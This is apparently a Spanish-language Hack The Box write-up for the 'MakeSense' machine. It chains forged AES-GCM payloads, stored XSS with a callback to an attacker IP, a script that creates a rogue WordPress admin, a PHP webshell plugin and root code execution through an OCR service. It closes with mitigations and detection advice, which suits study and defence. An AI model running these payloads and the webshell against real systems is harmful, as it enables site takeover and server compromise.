---
machine: MakeSense
os: Linux
difficulty: Medium
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/918
category: Machines
state: Retired
pwned: 2026-11-07
tags: [web, wordpress, xss, aes-gcm, php, privesc]
---

# MakeSense — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (07/11/2026) · [machine 918](https://labs.hackthebox.com/achievement/machine/4187928/918) · rank #4897 · 650 XP.
> Las flags y credenciales reales están en `private/` y no se publican aquí.

## TL;DR

WordPress con un tema a medida (`webagency`) que transcribe voz en el navegador y envía el resultado **cifrado con AES-256-GCM** a `admin-ajax.php`. La clave está en el JS del tema, así que se puede forjar un payload válido: el campo `summary` se descifra y se renderiza **sin escapar** en el panel, donde un bot admin entra cada minuto → XSS almacenado. Con el XSS se crea un administrador nuevo, se sube un plugin y se obtiene RCE como `www-data`. `wp-config.php` filtra la contraseña de `walter`, reutilizada en SSH. Para escalar: un servicio OCR en `127.0.0.1:8001` corre como **root** y guarda sus resultados en su propio docroot → se le hace transcribir un payload PHP, se guarda como `.php` y se ejecuta como root.

## Reconocimiento

WordPress **7.0** con Apache 2.4.58 sobre Ubuntu 24.04; el `http-generator` y `readme.html` lo confirman. Las fuentes discrepan en la base de datos (MySQL/MariaDB en unos writeups, SQLite en otros): no cambia la cadena.

```bash
# 1. Vhost en /etc/hosts (o usar --resolve, ver abajo)
echo "10.129.145.90 makesense.htb" | sudo tee -a /etc/hosts

# 2. Escaneo completo y detección de servicios
nmap -Pn -p- -T4 --min-rate 1000 --open 10.129.145.90
nmap -Pn -sS -sV -p 22,80,443,8001 10.129.145.90
```

- Puertos: **22** (OpenSSH 9.6p1 Ubuntu), **443** (Apache 2.4.58, Ubuntu), **80 y 8001 filtrados**.
- Servicios: WordPress + tema `webagency`; Chrome headless/chromedriver (bot admin); `tesseract` instalado.

Si no quieres tocar `/etc/hosts`, la alternativa equivalente:

```bash
curl -sk --resolve makesense.htb:443:10.129.145.90 https://makesense.htb/ -o home.html
```

## Enumeración

```bash
# Tecnología y vhost
curl -sk --resolve makesense.htb:443:10.129.145.90 -I https://makesense.htb/
curl -sk --resolve makesense.htb:443:10.129.145.90 https://makesense.htb/ | \
  grep -oE '/wp-content/(themes|plugins)/[A-Za-z0-9_.-]+' | sort -u

# Assets del tema: ahí está toda la lógica
for f in main.js assets/js/whisper/whisper.js assets/js/whisper/whisper-wrapper.js; do
  curl -sk --resolve makesense.htb:443:10.129.145.90 \
    "https://makesense.htb/wp-content/themes/webagency/$f" -o "$(basename $f)"
done

# Directory listing en uploads (sí, estaba abierto)
curl -sk --resolve makesense.htb:443:10.129.145.90 https://makesense.htb/wp-content/uploads/
```

Hallazgos:

- **Nonce público** incrustado en el HTML de la portada:

  ```html
  <script id="whisper-wrapper-js-extra">
  var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php",
                        "nonce":"<NONCE>","theme_url":"...","site_url":"..."};
  </script>
  ```

- `whisper-wrapper.js` define `const ENCRYPTION_KEY = '<clave>'` en **cliente**, y `functions.php` la replica en servidor como `WEBAGENCY_ENCRYPTION_KEY`. Consecuencia: cualquiera puede cifrar payloads que el backend aceptará como legítimos.
- `main.js` revela el flujo completo (ver Foothold) y el nombre exacto de cada campo.
- `/wp-content/uploads/` con listado de directorios: permite ver los audios subidos y sus nombres.

## Foothold

### El flujo real de la aplicación

1. `save_voice_raw` — multipart con `action`, `nonce` y `voice_recording` (WAV). Devuelve un `post_id` real:

   ```json
   {"success":true,"data":{"message":"Audio saved, processing started.","post_id":69}}
   ```

2. El navegador transcribe y **cifra** `{transcription, summary}`.
3. `save_voice_results` — multipart con `action`, `nonce`, `post_id` y `encrypted_payload`. Responde `"Results saved successfully!"`.

### El cifrado (y por qué se puede forjar)

`whisper.js` → `encryptPayload()`:

- Clave AES-256 = `SHA-256(ENCRYPTION_KEY)` (texto de la clave, sin sal).
- AES-GCM con IV aleatorio de **12 bytes**; WebCrypto añade el tag al final.
- Se envía `base64(IV ‖ ciphertext ‖ tag)`.

Con la clave pública del JS, el cifrado deja de ser una frontera de confianza:

```python
import base64, hashlib, json, os
from Crypto.Cipher import AES

ENCRYPTION_KEY = "<clave del JS>"

def encrypt(obj):
    key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()
    iv = os.urandom(12)
    ct, tag = AES.new(key, AES.MODE_GCM, nonce=iv).encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(iv + ct + tag).decode()
```

### Errores que cuestan tiempo

- `main.js` envía `encrypted_payload`; usar `payload` (como hacían los scripts antiguos) devuelve `success` pero no guarda nada.
- La acción es `save_voice_results`, no `submit_transcription`, y el POST va a `admin-ajax.php`, no a la raíz.
- El nonce se lee de la portada y caduca; hay que refrescarlo en cada ejecución.

### XSS almacenado en el panel

El `summary` se guarda cifrado, se descifra en servidor y se pinta **sin escapar** en `wp-admin/edit.php?post_type=contact_submission`. El bot admin (`admin`) visita esa página cada ~60 s.

Dos detalles que deciden si el payload funciona:

1. El render es por `innerHTML` → `<script>` **no se ejecuta**; hay que usar `onerror`.
2. El campo pasa por un escapado que convierte `"` en `&quot;` y estropea el JS: **una sola línea y solo comillas simples**.

Payload que confirma ejecución (beacon mínimo):

```html
<img src=x onerror="new Image().src='http://10.10.15.215:8000/?r=ALIVE'">
```

Catcher para recibir los hits:

```bash
python3 -m http.server 8000        # o el catcher de ms_exploit.py --listen
```

El primer hit trae `wp-settings-time-3=...` y `https://makesense.htb/wp-admin/edit.php?post_type=contact_submission`: el JS corre **autenticado como administrador**. La cookie `wordpress_logged_in` es HttpOnly, así que robar la cookie no sirve: hay que actuar **dentro** del navegador del bot.

### De XSS a administrador propio

`user-new.php` crea usuarios con un nonce que el propio bot puede leer (mismo origen). Este payload, en una sola línea y sin comillas dobles, se inyecta igual en `summary`:

```js
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(t=>{var d=new DOMParser().parseFromString(t,'text/html'),n=d.querySelector('[name=_wpnonce_create-user]').value,f=new FormData();f.append('action','createuser');f.append('_wpnonce_create-user',n);f.append('_wp_http_referer','/wp-admin/user-new.php');f.append('user_login','pwned');f.append('email','pwned@makesense.htb');f.append('pass1','<PASS>');f.append('pass2','<PASS>');f.append('role','administrator');f.append('createuser','Add New User');fetch('/wp-admin/user-new.php',{method:'POST',body:f}).then(r=>r.text())})
```

Verificación (el beacon de confirmación puede perderse; lo fiable es el login):

```bash
curl -sk -c cj.txt -b "wordpress_test_cookie=WP+Cookie+check" \
  --data-urlencode "log=pwned" --data-urlencode "pwd=<PASS>" \
  -d "wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  https://makesense.htb/wp-login.php -o /dev/null -w '%{http_code}\n'   # 302
grep -c wordpress_logged_in cj.txt                                      # 1
```

## Movimiento lateral

### www-data vía plugin

Un administrador de WordPress puede subir plugins; el ZIP se empaqueta con un webshell dentro:

```php
<?php /* Plugin Name: Pwn Shell */ if (isset($_REQUEST['c'])) { echo shell_exec($_REQUEST['c']); } ?>
```

```bash
python3 - <<'PY'
import zipfile
php = '<?php /* Plugin Name: Pwn Shell */ if (isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]); } ?>'
with zipfile.ZipFile('/tmp/pwn.zip','w') as z:
    z.writestr('pwn-shell/shell.php', php)
PY

# nonce del formulario de subida
N=$(curl -sk -b cj.txt https://makesense.htb/wp-admin/plugin-install.php?tab=upload \
      | grep -o 'name="_wpnonce" value="[A-Za-z0-9]*"' | head -1 | sed 's/.*value="//;s/"//')

curl -sk -b cj.txt -F "pluginzip=@/tmp/pwn.zip;type=application/zip" -F "_wpnonce=$N" \
  -F "install-plugin-submit=Install Now" \
  "https://makesense.htb/wp-admin/update.php?action=upload-plugin"     # "Plugin installed successfully"

curl -sk --data-urlencode "c=id" \
  https://makesense.htb/wp-content/plugins/pwn-shell/shell.php        # uid=33(www-data)
```

### www-data → walter

`wp-config.php` (legible por `www-data`) trae las credenciales de la base de datos, y **la contraseña está reutilizada en SSH**:

```bash
curl -sk --data-urlencode 'c=grep -E "DB_USER|DB_PASSWORD" /var/www/html/wp-config.php' \
  https://makesense.htb/wp-content/plugins/pwn-shell/shell.php

sshpass -p '<DB_PASSWORD>' ssh walter@10.129.145.90 'id; cat ~/user.txt'
```

## Escalada de privilegios

### Enumeración local

Falso positivo habitual: **PackageKit 1.2.8** invita a probar CVE-2026-41651 (*Pack2TheRoot*), pero Ubuntu backportó el parche sin subir la versión. No es la vía y cuesta tiempo.

```bash
id; groups
ps aux | grep -vE '^\[|kthread|kworker' | head -30
ss -ltnp
ls -la /opt
```

Lo relevante:

```
root 1401  php -S 127.0.0.1:8001 -t /root/ocr4/
```

Un servidor PHP embebido que **corre como root**, escucha solo en loopback y sirve `/root/ocr4`. Como `walter`, se llega a él:

```bash
curl -si http://127.0.0.1:8001/                    # 401, WWW-Authenticate: Basic realm="OCR Protected"
curl -s -u '<user>:<pass>' http://127.0.0.1:8001/  # 200 -> canvas OCR
```

Las mismas credenciales de `walter` abren el Basic auth.

### Anatomía de la app OCR

- Un canvas envía `canvas_image=data:image/png;base64,...`.
- Tesseract hace el OCR y devuelve el texto (`class="result-block"`).
- Un segundo formulario **guarda** el resultado: `ocr_id`, `filename` y el botón `save_output=Save`.
- El guardado escribe en `saved/` **dentro del docroot** del `php -S`.

### Qué NO funciona (probado)

| Intento | Resultado |
|---|---|
| Inyección en `filename` (`x; sleep 5; #`, `$(sleep 5)`) | Sin retardo: el nombre se sanea a `[A-Za-z0-9._-]`, el resto pasa a `_` |
| Traversal en `filename` (`../`, `/tmp/x`) | Se eliminan `/` y `..`; todo cae en `saved/` |
| Traversal en `ocr_id` (`../../root/root.txt`) | `Invalid OCR request. Cannot save.` |
| Inyección en el MIME del data URL | Respuesta inmediata, sin efecto |
| Omitir `save_output` | `notice error` (falta el `name` del botón) |

### El vector: escribir código en un docroot de root

El `filename` sí conserva letras, dígitos y puntos → se puede pedir `x.php`. Y el contenido del archivo es **el texto que Tesseract reconoce de la imagen que subimos**. Así que se le hace transcribir un payload PHP y se ejecuta como root.

```bash
python3 - <<'PY'
from PIL import Image, ImageDraw, ImageFont
txt = '<?php echo file_get_contents("/root/root.txt"); ?>'
f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 60)
img = Image.new("RGB", (int(f.getlength(txt)) + 80, 110), "white")
ImageDraw.Draw(img).text((30, 22), txt, fill="black", font=f)
img.save("/tmp/root.png")
PY

# 1) subir la imagen y quedarse con el ocr_id
curl -s -u '<user>:<pass>' -c cj_ocr.txt \
  --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 /tmp/root.png)" \
  http://127.0.0.1:8001/ -o ocr.html
ID=$(grep -o 'name="ocr_id" value="[^"]*"' ocr.html | sed 's/.*value="//;s/"//')

# 2) guardar el resultado como PHP (ejecuta en el docroot)
curl -s -u '<user>:<pass>' -b cj_ocr.txt \
  --data-urlencode "ocr_id=$ID" --data-urlencode "filename=r1.php" \
  --data-urlencode "save_output=Save" http://127.0.0.1:8001/
# -> Saved as: saved/r1.php

# 3) ejecutar como root
curl -s -u '<user>:<pass>' http://127.0.0.1:8001/saved/r1.php      # flag de root
```

Con `<?php echo shell_exec("id"); ?>` se confirma el contexto:

```
uid=0(root) gid=0(root) groups=0(root)
```

Nota: `saved/` es efímero (el servicio limpia los archivos), así que si hay que re-verificar conviene repetir los tres pasos seguidos.

## Evidencia

Salidas observadas (sin flags ni credenciales):

```
$ curl -u <cred> http://127.0.0.1:8001/saved/r3.php
uid=0(root) gid=0(root) groups=0(root)

$ curl -u <cred> http://127.0.0.1:8001/saved/t.php      # <?php echo 7*7; ?>
49

$ curl -sk --data-urlencode c=id https://makesense.htb/wp-content/plugins/pwn-shell/shell.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Para un repo público conviene recortar capturas del panel, del OCR y del `uid=0`, y **nunca** incluir flags.

## Lecciones aprendidas

- **Leer el JS del tema antes de escribir exploits**: dos horas de scripts fallidos se debían a un nombre de campo (`encrypted_payload`) y a una acción equivocada.
- **`innerHTML` + `<script>` no ejecuta**; `onerror` sí. Y el escapado de `"` a `&quot;` obliga a payloads de una línea con comillas simples.
- **Un secreto en el cliente no es un secreto**: la clave AES en el JS convierte el cifrado en un formato, no en un control de seguridad.
- **Credenciales reutilizadas**: la contraseña de la base de datos abrió también SSH y el Basic auth del servicio interno.
- **Servicios en loopback = pivote desde usuario, no desde anónimo**: sin `walter` el 8001 es inalcanzable (de ahí el `filtered` del escaneo externo).
- **Los directorios de guardado dentro de un docroot son ejecución de código** si el servidor interpreta PHP.
- **Un CVE que "casa por versión" puede estar parcheado por backport**: comprobar el changelog del paquete antes de invertir la sesión en él.
- Detalle práctico: el bot tarda ~60 s y los archivos guardados caducan; conviene automatizar cada fase en un solo script.

## Mitigaciones y detección

Correcciones:

- Escapar la salida del panel (`esc_html`, `wp_kses_post`) y aplicar **capabilities + nonce** a `save_voice_results` en lugar de aceptar cualquier `post_id`.
- No cifrar en cliente con clave pública: si el dato es sensible, el secreto va en servidor; el cifrado en cliente no aporta confidencialidad frente al usuario.
- Endurecer WordPress: `DISALLOW_FILE_MODS` / `DISALLOW_FILE_EDIT`, plugins desde repositorio firmado, revisión de quién puede `install_plugins`.
- **Mínimo privilegio** para el servicio OCR: usuario dedicado (no root), `open_basedir`, sin escritura en el docroot, resultados fuera del árbol servido.
- No reutilizar la contraseña de la base de datos en SSH ni en servicios internos; Basic auth con credenciales propias y fuertes, o mTLS en loopback.
- Desactivar directory listing en `uploads/` y filtrar extensiones permitidas.

Detección:

- Alertas por **nuevos usuarios administrador** y por `user-new.php` desde sesiones del bot.
- Integridad de archivos en `wp-content` (plugins y `.php` nuevos) → FIM/EDR.
- Procesos PHP que lanzan `tesseract` o escriben `.php` en su propio docroot (cadena de procesos anómala).
- Accesos a `127.0.0.1:8001` desde cuentas que no lo necesitan.

Referencias: CWE-79 (XSS almacenado), CWE-798 (credenciales embebidas), CWE-250/CWE-269 (permisos excesivos), CWE-434 (subida de archivos peligrosos), OWASP Top 10 A03/A07, MITRE ATT&CK T1059.004 y T1505.003.

## Referencias

- Máquina: <https://labs.hackthebox.com/achievement/machine/4187928/918>
- WordPress hardening: <https://developer.wordpress.org/advanced-administration/security/hardening/>
- WebCrypto AES-GCM: <https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt>
- PHP built-in server: <https://www.php.net/manual/en/features.commandline.webserver.php>
